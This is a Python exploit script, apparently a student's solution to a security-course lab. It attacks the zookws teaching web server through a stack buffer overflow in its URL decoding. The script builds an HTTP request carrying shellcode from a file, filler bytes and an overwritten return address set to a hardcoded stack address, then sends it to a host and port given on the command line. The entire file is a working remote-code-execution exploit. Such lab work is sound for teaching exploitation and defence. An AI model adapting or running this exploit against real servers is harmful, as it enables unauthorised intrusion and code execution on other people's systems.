#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x34567890
stack_saved_ebp = 0x12345678
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

# exploit url_decode vulnerability http.c:105. This attack injects shellcode
# into `reqpath` buffer by providing a long HTTP request uri
def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    # bytes ensure the path is valid and the web server doesn't return an error
    leading_bytes = "/"
    request_uri = leading_bytes + shellcode

    # Compute number of filler bytes. These are the bytes after the shellcode
    # and before the return address.
    ebp_buffer_diff = 0x810
    ret_buffer_diff = ebp_buffer_diff + 4

    # Append trailing bytes. Note that its important to not use ' ', because
    # the web server will trait to bytes after the first space as not part
    # of the request uri.
    trailing_bytes = ret_buffer_diff - len(request_uri)
    request_uri = request_uri + "z" * (trailing_bytes )

    # compute the return address to jump to
    reqpath_addr = 0xbfffee08
    jump_addr = reqpath_addr + len(leading_bytes)
    return_addr = struct.pack("<I", jump_addr)

    # Append to return address to the buffer
    request_uri = request_uri + return_addr

    req = "GET " + request_uri + " HTTP/1.0\r\n" + \
            "\r\n"
    print ("req uri len: " + str(len(request_uri)))
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
	resp = resp + rbuf
	rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

